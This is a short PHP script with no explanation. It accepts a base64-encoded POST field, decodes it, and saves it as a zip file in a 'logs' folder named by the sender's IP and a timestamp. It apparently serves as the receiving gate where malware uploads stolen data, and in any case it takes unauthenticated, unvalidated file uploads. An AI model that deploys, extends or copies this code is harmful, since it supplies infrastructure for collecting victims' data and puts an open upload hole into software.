<?php
$ip = $_SERVER['REMOTE_ADDR'];
if(isset($_POST["zipx"])){
	$date = date("d-m-Y");
	$time = date("h-i");
	$zip = $_POST["zipx"];
    $content = base64_decode($zip);
    $file = fopen('logs/' . $ip . '_' . $date. '_' . $time . '.zip',"w");
    fwrite($file, $content);
    fclose($file);
    echo 'good';
}
?>